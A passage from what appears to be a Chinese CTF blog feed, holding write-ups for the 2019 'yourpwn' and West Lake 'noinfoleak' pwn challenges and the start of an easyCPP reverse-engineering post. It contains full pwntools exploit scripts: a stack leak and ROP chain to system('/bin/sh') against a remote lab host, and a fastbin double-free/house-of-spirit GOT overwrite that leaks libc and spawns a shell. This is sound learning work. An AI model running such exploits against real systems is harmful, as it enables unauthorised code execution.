class="number">0xd03</span></span><br><span class="line"></span><br><span class="line">stack_addr=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">stack_addr=getaddr(<span class="number">344</span><span class="number">-8</span>+i,stack_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack_addr:"</span>+stack_addr</span><br><span class="line"></span><br><span class="line">bin_addr=int(stack_addr,<span class="number">16</span>)<span class="number">-0x100</span></span><br><span class="line"></span><br><span class="line">libc_addr=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">libc_addr=getaddr(<span class="number">632</span>+i,libc_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_addr:"</span>+libc_addr</span><br><span class="line">libcb=int(libc_addr,<span class="number">16</span>)</span><br><span class="line">libca=int(libc_addr,<span class="number">16</span>)<span class="number">-231</span>-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts_plt=base_addr+elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">bad=<span class="string">'0'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">24</span><span class="number">-8</span>+<span class="number">1</span>):</span><br><span class="line">getaddr(<span class="number">1</span>,bad)</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"do you want continue(yes/no)?"</span>,<span class="string">"yes"</span>)</span><br><span class="line"></span><br><span class="line">popedi=str(hex(popedi_addr)[<span class="number">2</span>:])</span><br><span class="line">popedi=popedi.zfill(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+i,popedi[<span class="number">2</span>*(<span class="number">8</span>-i)<span class="number">-2</span>:<span class="number">2</span>*(<span class="number">8</span>-i)])</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin=str(hex(bin_addr)[2:])</span></span><br><span class="line"><span class="comment">#bin=bin.zfill(16)</span></span><br><span class="line">libcaddr=hex(int(libc_addr,<span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">libcaddr=libcaddr.zfill(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+<span class="number">8</span>+i,libcaddr[<span class="number">2</span>*(<span class="number">8</span>-i)<span class="number">-2</span>:<span class="number">2</span>*(<span class="number">8</span>-i)])</span><br><span class="line"></span><br><span class="line">putsplt=str(hex(puts_plt)[<span class="number">2</span>:])</span><br><span class="line">putsplt=putsplt.zfill(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_plt:"</span>+putsplt</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+<span class="number">16</span>+i,putsplt[<span class="number">2</span>*(<span class="number">8</span>-i)<span class="number">-2</span>:<span class="number">2</span>*(<span class="number">8</span>-i)])</span><br><span class="line"></span><br><span class="line">bin_sh=<span class="string">"/bin/sh\x00"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+<span class="number">24</span>+i,hex(ord(bin_sh[(i):(i+<span class="number">1</span>)]))[<span class="number">2</span>:])</span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">24</span><span class="number">-8</span><span class="number">-8</span>+<span class="number">1</span>):</span><br><span class="line">getaddr(<span class="number">1</span>,bad)</span><br><span class="line">s.sendlineafter(<span class="string">"do you want continue(yes/no)?"</span>,<span class="string">"yes"</span>)</span><br><span class="line"></span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/2019-4-21-dishierjie/2019-4-24-yourpwn2.png" alt="avatar"><br>可以看到返回的值，puts遇到/x00会结束</p><p>但是这里我遇到了一个坑，就是我kali环境下gdb里显示栈里存放的是libc_start+231，导致我在把获得的后12位去libc库上查不到，之后我想找几个ubuntu的libc查查89 c7 e8 f9  97 01是否存在，然后第一次就在我的ubuntu16上找到了</p><p><img src="/images/2019-4-21-dishierjie/2019-4-24-yourpwn3.png" alt="avatar"><br>一算偏移发现是240，于是构造脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">s=remote(<span class="string">'1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com'</span>,<span class="number">57856</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getaddr</span><span class="params">(num,addr)</span>:</span></span><br><span class="line">s.sendlineafter(<span class="string">'input index'</span>,str(num))</span><br><span class="line">re=s.recvuntil(<span class="string">'input'</span>)[<span class="number">-8</span>:<span class="number">-6</span>]</span><br><span class="line"><span class="keyword">if</span> int(re,<span class="number">16</span>)&lt;=<span class="number">15</span>:</span><br><span class="line">addr=<span class="string">"0"</span>+hex(int(re,<span class="number">16</span>))[<span class="number">2</span>:]+addr</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">addr=str(hex(int(re,<span class="number">16</span>)))[<span class="number">2</span>:]+addr</span><br><span class="line">s.sendlineafter(<span class="string">'new value'</span>,str(int(re,<span class="number">16</span>)))</span><br><span class="line"><span class="comment">#print addr</span></span><br><span class="line"><span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,addr)</span>:</span></span><br><span class="line">s.sendlineafter(<span class="string">'input index'</span>,str(num))</span><br><span class="line">re=s.recvuntil(<span class="string">'input'</span>)[<span class="number">-8</span>:<span class="number">-6</span>]</span><br><span class="line"><span class="comment">#addr=str(hex(int(re,16)))[2:]+addr</span></span><br><span class="line">s.sendlineafter(<span class="string">'new value'</span>,str(int(addr,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">'name:'</span>,<span class="string">"yes"</span>)</span><br><span class="line"></span><br><span class="line">b11_addr=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">b11_addr=getaddr(<span class="number">344</span>+i,b11_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"b11_addr:"</span>+b11_addr</span><br><span class="line"></span><br><span class="line">base_addr=int(b11_addr,<span class="number">16</span>)<span class="number">-0xb11</span></span><br><span class="line"><span class="comment">#system_plt=base_addr+elf.plt['system']</span></span><br><span class="line">popedi_addr=base_addr+<span class="number">0xd03</span></span><br><span class="line"></span><br><span class="line">stack_addr=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">stack_addr=getaddr(<span class="number">344</span><span class="number">-8</span>+i,stack_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack_addr:"</span>+stack_addr</span><br><span class="line"></span><br><span class="line">bin_addr=int(stack_addr,<span class="number">16</span>)<span class="number">-0x100</span></span><br><span class="line"></span><br><span class="line">libc_addr=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">libc_addr=getaddr(<span class="number">632</span>+i,libc_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_addr:"</span>+libc_addr</span><br><span class="line"></span><br><span class="line">libca=int(libc_addr,<span class="number">16</span>)<span class="number">-240</span><span class="number">-0x20740</span></span><br><span class="line">system_plt=libca+<span class="number">0x45390</span></span><br><span class="line"></span><br><span class="line">bad=<span class="string">'0'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">24</span><span class="number">-8</span>+<span class="number">1</span>):</span><br><span class="line">getaddr(<span class="number">1</span>,bad)</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"do you want continue(yes/no)?"</span>,<span class="string">"yes"</span>)</span><br><span class="line"></span><br><span class="line">popedi=str(hex(popedi_addr)[<span class="number">2</span>:])</span><br><span class="line">popedi=popedi.zfill(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+i,popedi[<span class="number">2</span>*(<span class="number">8</span>-i)<span class="number">-2</span>:<span class="number">2</span>*(<span class="number">8</span>-i)])</span><br><span class="line"></span><br><span class="line">bin=str(hex(bin_addr)[<span class="number">2</span>:])</span><br><span class="line">bin=bin.zfill(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+<span class="number">8</span>+i,bin[<span class="number">2</span>*(<span class="number">8</span>-i)<span class="number">-2</span>:<span class="number">2</span>*(<span class="number">8</span>-i)])</span><br><span class="line"></span><br><span class="line">syst=str(hex(system_plt)[<span class="number">2</span>:])</span><br><span class="line">syst=syst.zfill(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system:"</span>+syst</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+<span class="number">16</span>+i,syst[<span class="number">2</span>*(<span class="number">8</span>-i)<span class="number">-2</span>:<span class="number">2</span>*(<span class="number">8</span>-i)])</span><br><span class="line"></span><br><span class="line">bin_sh=<span class="string">"/bin/sh\x00"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+<span class="number">24</span>+i,hex(ord(bin_sh[(i):(i+<span class="number">1</span>)]))[<span class="number">2</span>:])</span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">24</span><span class="number">-8</span><span class="number">-8</span>+<span class="number">1</span>):</span><br><span class="line">getaddr(<span class="number">1</span>,bad)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure><p>结果就成功拿到进入shell，这次比赛比较奇怪，拿到shell后弹出的是congritulation，然后输入token值就拿到flag了，不懂是怎么实现的，原本我还想现学现写个Dynelf的leak函数来搜索内存的，就是在puts后面再放个libc_start的地址，构成一个可以不断循环的leak函数，然后调用Dynelf函数就能搜索指定的函数起始地址了。</p><p>第二天看了眼babypwn没思路，加上有事就没打了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-4-18-noinfoleak</title>
      <link href="/passages/2019-4-18-noinfoleak/"/>
      <url>/passages/2019-4-18-noinfoleak/</url>
      
        <content type="html"><![CDATA[<h2 id="2019西湖论剑杯pwn-noinfoleak"><a href="#2019西湖论剑杯pwn-noinfoleak" class="headerlink" title="2019西湖论剑杯pwn-noinfoleak"></a>2019西湖论剑杯pwn-noinfoleak</h2><p>这题在比赛的时候没能做出来，借着这道题学习一下fastbin attack的doublefree和house of spirit </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_400846();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">          v4 = sub_4008A7();</span><br><span class="line">          <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          add();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No Such Choice"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目逻辑很清楚，就三个功能，添加表，编辑表，删除表，漏洞在删除表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">  v0 = sub_4008A7();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> &amp;&amp; v0 &lt;= <span class="number">15</span> )</span><br><span class="line">    <span class="built_in">free</span>(qword_6010A0[<span class="number">2</span> * v0]);<span class="comment">//free后没有置0，存在uaf</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以使用fastbin的double free实现任意地址写，大致原理就是：fastbin是一个后进先出（LIFO）的单向链表，chunk大小包含16-80byte，只有一个fd指针，当我们malloc两个chunk，然后按照第一、第二、第一的顺序free，就会发现两个chunk的fd各自指向对方，这就存在double free。<br>这时候只要使用house of spirit技术，也就是申请相同大小的栈，并且加上数据fake_chunk_addr，然后接着再连续申请两次，第四次申请的时候就会把fake_chunk_addr作为一个chunk分配给你。<br>fake_chunk_addr只要满足几个条件，其中一个是fake_chunk_addr的size段要符合fastbin，而且要满足malloc的要求，这一题只需要知道这两点（其它条件我一时搞不明白），这里所谓的double free就是两次free同一个chunk从而能分配到一个fake_chunk，但是不能连续free同一个chunk两个，这会触发警报，而且free的chunk的fd不能指向自身。<br>这一题我们会发现在index数组(0x6010a0)的上方0x60108d处有一个0x7f，正好符合fastbin的size，我们可以利用double free使得(0x60108d-8)进入index数组，然后通过edit函数对(0x60108d-8）进行写入，然后就能随意地修改index数组，让各个index指向我们想要的地址。<br>虽然能进行任意写了，但是这题没有能泄露信息的函数，这就需要我们自己构造info leak了，其中一个方法是把已有的函数比如free的got表内容改成puts_plt，这样调用free时就会变成free-&gt;free_plt-&gt;free_got-&gt;puts_plt-&gt;puts_got（这里的原理我不清楚）,从而调用puts，这时候index数组的地址值原本是在delete函数中作为free的参数的，现在变成了puts的参数，因此我们可以把puts_got的值通过之前的house of spirit放入index数组中，然后更改free_got表，之后调用delete函数就能泄露出puts的实际地址了（got表中存储着函数的真实地址），然后就能计算base_addr，之后得到system_addr，把free_got的内容再修改成system_addr的值，这时候add(0x20,”/bin/sh\00”)，那么index数组里面就多出了一个/bin/sh字符串的地址，再调用delete就好了。<br>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.terminal = ["tmux", "splitw", "-h"] </span></span><br><span class="line">sh=process(<span class="string">'./noinfoleak'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./noinfoleak'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">putsPlt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">putsGot=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">freeGot=elf.got[<span class="string">'free'</span>]</span><br><span class="line">log.info(<span class="string">'puts:%x'</span>%(putsPlt))</span><br><span class="line">log.info(<span class="string">'free:%x'</span>%(freeGot))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(Size,context)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(str(Size))</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,context)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.send(context)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">add(<span class="number">96</span>,<span class="string">'aaaa'</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">96</span>,<span class="string">'bbbb'</span>)  <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line">dele(<span class="number">0</span>)  </span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">targetAddr=p64(<span class="number">0x60108d</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,targetAddr) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'bbbb'</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'cccc'</span>)     <span class="comment">#4</span></span><br><span class="line"><span class="comment">#fake chunk to bss</span></span><br><span class="line">payload=<span class="string">'\x00'</span>*(<span class="number">3</span>+<span class="number">16</span>)+p64(freeGot)+p64(<span class="number">96</span>)+p64(putsGot)+p64(<span class="number">96</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload)   <span class="comment">#5  </span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(putsPlt))  <span class="comment"># freeGot-&gt;putsPlt</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#puts(putsAddr)</span></span><br><span class="line">putsaddr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">log.info(<span class="string">'putsAddr:%x'</span>%(putsaddr))</span><br><span class="line">libcAddr=putsaddr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.info(<span class="string">'libcAddr:%x'</span>%(libcAddr))</span><br><span class="line">systemAddr=libcAddr+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'systemAddr:%x'</span>%(systemAddr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(systemAddr)) <span class="comment"># freeGot-&gt;system</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'/bin/sh\x00'</span>) <span class="comment">#6</span></span><br><span class="line">dele(<span class="number">6</span>)   <span class="comment"># system('/bin/sh')</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>该脚本来自 <a href="https://blog.tangent.ink/" target="_blank" rel="noopener">https://blog.tangent.ink/</a><br>我只做了很小的修改以适应我系统的堆栈，网上找的脚本没有一个能在我kali本地跑的，也不懂得为什么，因为20还有一场比赛，所以对fastbin attack的学习先到这里。<br>遗留困惑:<br>1、double free到底能分配什么样的地址？因为我实际很多地址不能用double free，都会直接在heap里给我分配。<br>2、house of spirit对fake chunk的审查机制具体是怎么样的？为什么0x7f可以满足对size的检查，这里我有查到一篇 <a href="https://www.jianshu.com/p/1c4fab29ea34" target="_blank" rel="noopener">https://www.jianshu.com/p/1c4fab29ea34</a> 讲了自己实验的几个size，似乎后四位是f就能满足size的检查了？具体我也不太明白，因为我自己实验的0x60不知道为什么不能满足。<br>3、got、plt我虽然有经过学习，但是实际具体的函数是怎样的我并没有完全弄清，像这次的连续两次plt got我就不理解是怎么实现的，按理来说got表里应该是实际地址，希望之后阅读《程序员的自我修养》能理解这一点<br>4、在我看的七八个EXP里，有用到unsortbin、IO_FILE、uaf等技术，因为我实验了好久都难以复现，所以留在困惑里。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-4-17-近期比赛总结</title>
      <link href="/passages/2019-4-17-%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
      <url>/passages/2019-4-17-%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="2019西湖论剑杯-re-easyCPP"><a href="#2019西湖论剑杯-re-easyCPP" class="headerlink" title="2019西湖论剑杯-re-easyCPP"></a>2019西湖论剑杯-re-easyCPP</h2><p>这题的难点在对C++的STL容器的了解</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;T&gt; values;<span class="comment">//创建存放T类型元素的vertor容器。</span></span><br><span class="line"><span class="built_in">vector</span>&lt;T&gt;(向量容器)是一个长度可变的序列，用来存放 T 类型的对象。必要时，可以自动增加容量，但只能在序列的末尾高效地增加或删除元素。</span><br><span class="line">values.push_back();<span class="comment">//在序列的末尾添加一个元素</span></span><br><span class="line">back_inserter();<span class="comment">//创建一个使用push_back的迭代器，把一个vector容器的元素按顺序传递给另一个vector</span></span><br><span class="line">value.end();<span class="comment">//指向value最后一个元素的下一个元素</span></span><br><span class="line">value.begin();<span class="comment">//指向value的第一个元素</span></span><br><span class="line">value.back();<span class="comment">//指向value的最后一个元素</span></span><br><span class="line">transform();<span class="comment">//可以将函数应用到序列的元素上，并将这个函数返回的值保存到另一个序列中，它返回的迭代器指向输出序列所保存的最后一个元素的下一个位置。 </span></span><br><span class="line"><span class="function">OutputIterator <span class="title">transform</span> <span class="params">(InputIterator first1,InputIterator last1,OutputIterator result, UnaryOperation op)</span></span>;</span><br><span class="line">对于一元操作，将op应用于[first1, last1]范围内的每个元素，并将每个操作返回的值存储在以result开头的范围内。给定的op将被连续调用last1-first1+<span class="number">1</span>次。op可以是函数指针或函数对象或lambda表达式。</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">v10 = argv;</span><br><span class="line">v21 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span 